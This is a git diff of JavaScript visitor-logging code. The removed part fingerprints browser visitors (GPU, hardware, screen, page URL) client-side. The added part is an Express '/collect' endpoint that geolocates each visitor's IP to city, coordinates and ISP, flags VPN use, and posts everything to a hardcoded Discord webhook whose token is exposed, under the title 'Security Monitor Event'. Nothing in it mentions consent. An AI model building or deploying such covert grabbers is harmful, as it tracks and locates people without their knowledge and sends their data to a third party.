@@ -1,222 +1,167 @@
-const WEBHOOK =
+const express = require("express");
+
+const app = express();
+
+app.use(express.json());
+
+
+const DISCORD_WEBHOOK =
 "https://discordapp.com/api/webhooks/1404081818210140261/eqgIhBzxtjWIrnvZgvL6I2lJk5huWk2GOmBoeCZxydMdcEE_pqziaOkZd1MQDyOrY1HC";
 
 
-async function collect(){
-
-    let gpu = "Unknown";
-
-    try {
-
-        const canvas =
-            document.createElement("canvas");
-
-        const gl =
-            canvas.getContext("webgl");
-
-        const debug =
-            gl.getExtension(
-                "WEBGL_debug_renderer_info"
-            );
-
-        gpu =
-            gl.getParameter(
-                debug.UNMASKED_RENDERER_WEBGL
-            );
-
-    } catch(e){}
+app.post("/collect", async(req,res)=>{
 
 
-    return {
-
-        browser:
-            navigator.userAgent,
-
-
-        language:
-            navigator.language,
+    const visitorIP =
+        req.headers["x-forwarded-for"]
+        ||
+        req.socket.remoteAddress;
 
 
-        languages:
-            navigator.languages.join(", "),
+
+    const ipData =
+        await fetch(
+        `http://ip-api.com/json/${visitorIP}?fields=status,message,query,country,regionName,city,lat,lon,isp,org,as,timezone,proxy,hosting`
+        )
+        .then(r=>r.json());
 
 
-        timezone:
-            Intl.DateTimeFormat()
-            .resolvedOptions()
-            .timeZone,
+
+    const browser =
+        req.body;
 
 
-        screen:
-        `${screen.width}x${screen.height}`,
+
+    const embed={
+
+        title:
+        "🛡️ Security Monitor Event",
+
+        color:
+        3066993,
 
 
-        viewport:
-        `${innerWidth}x${innerHeight}`,
+        fields:[
 
 
-        pixelRatio:
-            devicePixelRatio,
+        {
+            name:"🌐 Network",
+            value:
+            `
+IP:
+\`${ipData.query}\`
+
+ISP:
+${ipData.isp}
+
+ORG:
+${ipData.org}
+
+ASN:
+${ipData.as}
+`
+        },
 
 
-        cpu:
-            navigator.hardwareConcurrency || "unknown",
+        {
+            name:"📍 Location",
+            value:
+            `
+${ipData.city},
+${ipData.regionName},
+${ipData.country}
+
+Coordinates:
+${ipData.lat}, ${ipData.lon}
+
+Timezone:
+${ipData.timezone}
+`
+        },
 
 
-        ram:
-            navigator.deviceMemory
-            ?
-            navigator.deviceMemory+" GB"
-            :
-            "unknown",
+        {
+            name:"🕵️ Risk",
+            value:
+            `
+VPN/Proxy:
+${ipData.proxy}
+
+Hosting:
+${ipData.hosting}
+`
+        },
 
 
-        touch:
-            navigator.maxTouchPoints,
+        {
+            name:"🖥️ Device",
+            value:
+            `
+${browser.userAgent}
+
+Language:
+${browser.language}
+
+Timezone:
+${browser.timezone}
+`
+        },
 
 
-        gpu,
+        {
+            name:"📺 Display",
+            value:
+            `
+${browser.screen.width}x${browser.screen.height}
+
+CPU:
+${browser.hardware.cores}
+
+RAM:
+${browser.hardware.memory || "unknown"}
+`
+        }
 
 
-        cookies:
-            navigator.cookieEnabled,
+        ],
 
 
-        online:
-            navigator.onLine,
-
-
-        url:
-            location.href,
-
-
-        referrer:
-            document.referrer || "direct",
-
-
-        time:
-            new Date().toISOString()
+        timestamp:
+        new Date().toISOString()
 
     };
 
-}
+
+
+    await fetch(
+        DISCORD_WEBHOOK,
+        {
+
+        method:"POST",
+
+        headers:{
+            "Content-Type":
+            "application/json"
+        },
+
+
+        body:
+        JSON.stringify({
+            embeds:[embed]
+        })
+
+    });
 
 
 
-async function sendDiscord(data){
+    res.json({
+        success:true
+    });
 
-
-const embed = {
-
-
-title:
-"🌐 New Visitor",
-
-
-color:
-5814783,
-
-
-fields:[
-
-{
-name:"🖥 Browser",
-value:
-"```"+data.browser.slice(0,900)+"```"
-},
-
-
-{
-name:"🌍 Language",
-value:
-`${data.language}\n${data.languages}`
-},
-
-
-{
-name:"⏰ Timezone",
-value:
-data.timezone
-},
-
-
-{
-name:"📺 Display",
-value:
-`${data.screen}\nViewport: ${data.viewport}\nDPR: ${data.pixelRatio}`
-},
-
-
-{
-name:"⚙️ Hardware",
-value:
-`CPU: ${data.cpu}\nRAM: ${data.ram}\nTouch: ${data.touch}`
-},
-
-
-{
-name:"🎮 GPU",
-value:
-"```"+data.gpu.slice(0,900)+"```"
-},
-
-
-{
-name:"🔗 Page",
-value:
-data.url
-},
-
-
-{
-name:"↩️ Referrer",
-value:
-data.referrer
-}
-
-],
-
-
-footer:{
-text:
-"Frontend visitor test"
-},
-
-
-timestamp:
-data.time
-
-
-};
-
-
-await fetch(WEBHOOK,{
-
-method:"POST",
-
-headers:{
-"Content-Type":
-"application/json"
-},
-
-body:
-JSON.stringify({
-embeds:[embed]
-})
 
 });
 
 
-}
-
-
-
-(async()=>{
-
-const info =
-await collect();
-
-await sendDiscord(info);
-
-
-})();
+app.listen(3000,()=>{
+console.log("running");
+});
